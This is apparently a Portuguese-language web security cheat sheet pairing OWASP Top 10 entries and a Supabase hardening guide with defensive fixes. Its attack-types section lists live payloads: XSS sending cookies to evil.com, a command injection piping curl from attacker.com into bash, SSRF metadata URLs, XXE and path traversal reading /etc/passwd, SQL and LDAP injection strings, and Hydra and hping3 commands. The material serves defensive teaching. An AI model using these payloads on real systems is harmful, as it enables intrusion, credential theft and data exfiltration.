A01 — Controle de Acesso Quebrado
A01:2021
Falha nas restrições sobre o que usuários autenticados podem fazer. Inclui IDOR, escalada de privilégio e acesso a APIs sem autorização.

Exemplo: GET /api/users/1337 retorna dados de outro usuário sem verificação de ownership.

// Fix: verificar ownership no servidor
if (record.userId !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
Crítico

A02 — Falhas Criptográficas
A02:2021
Dados sensíveis transmitidos ou armazenados sem criptografia adequada. MD5/SHA1 para senhas, HTTP em vez de HTTPS, chaves hard-coded.

Exemplo: Senha armazenada como MD5: 5f4dcc3b5aa765d61d8327deb882cf99 = "password"

# Fix: use bcrypt ou argon2
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
Crítico
💉
A03 — Injeção
A03:2021
SQL Injection, NoSQL Injection, Command Injection, LDAP Injection. Dados não confiáveis enviados como parte de um comando ou query.

Exemplo SQL: ' OR 1=1 --

// Fix: use prepared statements
const result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);
Crítico

A04 — Design Inseguro
A04:2021
Riscos relacionados a falhas de design e arquitetura. Ausência de threat modeling, falta de princípios de least privilege.

Exemplo: Recuperação de senha via "pergunta secreta" facilmente adivinhável.

# Fix: use tokens temporários seguros
import secrets
reset_token = secrets.token_urlsafe(32)
# Token válido por 15 minutos, hash armazenado no DB
Alto

A05 — Configuração Incorreta
A05:2021
Configurações default inseguras, headers de segurança ausentes, permissões excessivas, debug ativado em produção.

Exemplo: Stack trace exposto em resposta de erro com credenciais de banco.

# Fix: desative debug em produção
DEBUG = os.environ.get('DEBUG', 'false').lower() == 'true'
app.config['PROPAGATE_EXCEPTIONS'] = not DEBUG
Alto

A06:2021

Exemplo: log4j 2.14.1 vulnerável a RCE via JNDI lookup.

A07 — Autenticação Falha
A07:2021
Sessões não invalidadas, senhas fracas permitidas, ausência de MFA, tokens JWT com algoritmo "none", credential stuffing.

Exemplo JWT: alg: "none" permite bypass de verificação de assinatura.

// Fix: sempre verifique o algoritmo
jwt.verify(token, secret, { algorithms: ['HS256'] });
Crítico

A08 — Falhas em Software e Integridade
A08:2021
Desserialização insegura, atualizações não verificadas, pipelines CI/CD comprometidos, supply chain attacks.

Exemplo: Pacote npm malicioso com mesmo nome de popular biblioteca (typosquatting).

# Fix: use lockfiles e verifique hashes

A09 — Falhas em Logging e Monitoramento
A09:2021
Eventos críticos não logados, logs sem integridade, ausência de alertas para atividades suspeitas, MTTR elevado após brecha.

Exemplo: 10.000 tentativas de login não detectadas porque não há alertas de rate.

// Fix: log eventos de segurança críticos
logger.warn({ event: 'login_failed', ip: req.ip, user: email, count: attempts });
Médio

A10 — SSRF
A10:2021
Server-Side Request Forgery: servidor faz requisições HTTP para URL controlada pelo atacante, acessando recursos internos como metadata AWS.

Exemplo: ?url=http://169.254.169.254/latest/meta-data/

# Fix: valide e restrinja destinos
ALLOWED_HOSTS = {"api.trusted.com", "cdn.trusted.com"}
parsed = urlparse(url)
if parsed.hostname not in ALLOWED_HOSTS:
    raise ValueError("Host não permitido")
Crítico
⚔️ Tipos de Ataque
Referência rápida de ataques mais comuns com exemplos e payloads de referência (para fins educacionais defensivos).
💪 Brute Force & Credential Stuffing

Tentativas massivas de login com senhas ou credenciais vazadas de outros serviços. Ferramentas: Hydra, Medusa, Burp Intruder.

hydra -L users.txt -P passwords.txt https-post-form \
  "site.com/auth/login:email=^USER^&password=^PASS^:Wrong password"

Defesa: Rate limiting, lockout após N falhas, CAPTCHA, MFA, monitorar IPs suspeitos.

🌊 DDoS (Distributed Denial of Service)

Ataque que sobrecarrega servidor com volume massivo de requisições. Tipos: volumétrico (UDP flood), protocolo (SYN flood), camada 7 (HTTP flood).

# SYN Flood (conceitual — NÃO execute sem autorização)
# hping3 --flood --syn --rand-source -p 80 target.com

# Detecção com tcpdump
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' | head -20

Defesa: CDN (Cloudflare, AWS Shield), rate limiting por IP, WAF, anycast routing.

💉 SQL Injection

Manipulação de queries SQL via inputs não sanitizados. Permite extração de dados, bypass de auth, execução de comandos (xp_cmdshell no MSSQL).

# Exemplos de payloads de detecção
' OR 1=1 --
' OR 'x'='x
1'; DROP TABLE users; --
' UNION SELECT username, password FROM users --
' AND SLEEP(5) --    # Time-based blind

Defesa: Prepared statements, ORM, WAF, princípio de least privilege no DB.

📜 XSS (Cross-Site Scripting)

Injeção de scripts maliciosos em páginas web. Tipos: Reflected (URL), Stored (persistido no DB), DOM-based (manipula o DOM client-side).

<script>document.location='https://evil.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('https://evil.com/'+btoa(document.cookie))">
javascript:alert(document.domain)   /* em href= */

Defesa: Sanitize inputs, use Content Security Policy (CSP), HttpOnly cookies, textContent em vez de innerHTML.

🌍 SSRF (Server-Side Request Forgery)

Força o servidor a fazer requisições para recursos internos. Pode acessar metadata cloud, serviços internos, bancos de dados não expostos.

# Payload clássico: AWS Instance Metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP metadata
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
# Bypass com redirect
http://attacker.com/redirect?to=http://internal-service/admin

Defesa: Allowlist de hosts/IPs, bloquear ranges RFC1918, não passar URL diretamente do usuário.

🔄 CSRF (Cross-Site Request Forgery)

Induz usuário autenticado a executar ações indesejadas. Explora confiança do servidor no browser do usuário.

<!-- Página maliciosa faz request para site autenticado -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
<form action="https://app.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>

Defesa: CSRF tokens, SameSite=Strict cookies, verificar Origin/Referer header, double submit cookie.

📦 XXE (XML External Entity)

Injection em parsers XML. Pode ler arquivos do servidor (/etc/passwd), fazer SSRF, DoS via billion laughs attack.

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Billion Laughs DoS -->
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">

Defesa: Desabilite DTD processing, use libraries com XXE protection por padrão (defusedxml em Python).

💻 RCE (Remote Code Execution)

Execução arbitrária de código no servidor. Via command injection, desserialização insegura, vulnerabilidades em frameworks.

# Command Injection
?filename=file.txt; cat /etc/passwd
?host=127.0.0.1 | whoami
?input=$(curl http://attacker.com/shell.sh | bash)

# Node.js eval injection
eval(req.query.code)  // NUNCA faça isso

Defesa: Nunca execute input do usuário, use allowlist para comandos, sandbox, princípio de least privilege.

📂 Path Traversal

Acessa arquivos fora do diretório permitido. Ler arquivos de configuração, chaves privadas, senhas do sistema.

GET /download?file=../../../etc/passwd
GET /read?path=....//....//etc/shadow
GET /view?doc=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

Defesa: Normalize paths antes de validar, use basename(), nunca concatene input diretamente em paths de arquivo.

📋 LDAP Injection

Similar ao SQL injection mas para serviços de diretório LDAP. Pode bypassar autenticação ou extrair entradas do diretório.

# Bypass de autenticação LDAP
username: *)(uid=*))(|(uid=*   # payload
# Resulta em: (&(uid=*)(uid=*))(|(uid=*)(password=qualquer))
# Query sempre verdadeira → bypass

Defesa: Escape special LDAP chars: ( ) * \ NUL. Use libraries com LDAP-safe encoding.

🔷 Segurança Supabase — Guia Completo
Melhores práticas e riscos específicos do Supabase para projetos em produção.
🚨 CRÍTICO: Nunca use a Service Role Key no frontend
A service role key bypassa todas as RLS policies. Se exposta em código JS do browser, qualquer usuário tem acesso administrativo completo ao banco. Use somente em backend seguro ou Edge Functions com autenticação adequada.
// ❌ ERRADO — service role key no frontend
const supabase = createClient(url, process.env.SUPABASE_SERVICE_KEY)

// ✅ CORRETO — anon key no frontend, service key apenas no server
const supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY)
🔒 Row Level Security (RLS) — Habilite SEMPRE
Sem RLS, qualquer usuário com a anon key pode ler/escrever em qualquer tabela. RLS deve ser habilitado em todas as tabelas que contêm dados de usuários.
-- Habilite RLS
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;

-- Policy: usuário só acessa próprios dados
CREATE POLICY "users_own_data" ON profiles
  FOR ALL USING (auth.uid() = user_id);

-- Verifique quais tabelas NÃO têm RLS
SELECT tablename FROM pg_tables
WHERE schemaname = 'public'
AND tablename NOT IN (SELECT tablename FROM pg_policies);
⚠️ Anon Key — Controle o que é acessível publicamente
A anon key é pública por design, mas o que ela pode acessar é controlado por RLS. Configure policies restritivas. Use a Dashboard → API para ver exatamente o que a anon role pode fazer.
-- Permita apenas leitura de dados públicos
CREATE POLICY "public_read" ON posts
  FOR SELECT USING (is_published = true);

-- Nenhuma operação de escrita para anon
-- (não criar policy de INSERT/UPDATE/DELETE para anon)
⚠️ Auth — Configure rate limiting e email confirmação
Por padrão, Supabase Auth pode ser abusado para spam de emails e brute force. Configure adequadamente no Dashboard → Auth → Settings.
-- Supabase Auth config recomendada (via Dashboard):
-- Email confirmation: ENABLED
-- Double confirm email change: ENABLED
-- Secure email change: ENABLED
-- Session expiry: 3600 (1 hora) para dados sensíveis
-- Enable captcha (hCaptcha ou Turnstile)
✅ Rate Limiting via Edge Functions
Implemente rate limiting customizado em Edge Functions para endpoints críticos usando upstash/ratelimit.
// Edge Function com rate limit (Upstash Redis)
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, "10 s"),
});

const { success } = await ratelimit.limit(req.headers.get("x-real-ip")!);
if (!success) return new Response("Too Many Requests", { status: 429 });
✅ Storage — Controle acesso a buckets
Buckets públicos expõem todos os arquivos. Use buckets privados com signed URLs para conteúdo sensível. Implemente RLS no storage também.
-- Bucket privado com policy de acesso
INSERT INTO storage.buckets (id, name, public)
VALUES ('documents', 'documents', false);  -- NÃO público

-- Policy: apenas dono pode acessar
CREATE POLICY "owner_access" ON storage.objects
  FOR ALL USING (auth.uid() = owner);

-- Gerar URL assinada válida por 60s (server-side)
const { data } = await supabase.storage
  .from('documents')
  .createSignedUrl('file.pdf', 60);
✅ API Rate Limits — Configure no projeto
Supabase tem rate limits por plano. Configure limites adicionais no seu projeto: Database → API Limits no Dashboard.

Execute regularmente esta checklist para manter seu projeto Supabase seguro.
□ RLS habilitado em todas as tabelas com dados de usuário
□ Service role key NUNCA no frontend ou repositório git
□ Email confirmation habilitado
□ Captcha habilitado para signup/login
□ Buckets de storage adequadamente privados
□ Edge Functions com auth validation
□ Segredos em variáveis de ambiente (não hard-coded)
□ Logs de Auth revisados regularmente
□ npm audit / dependências atualizadas
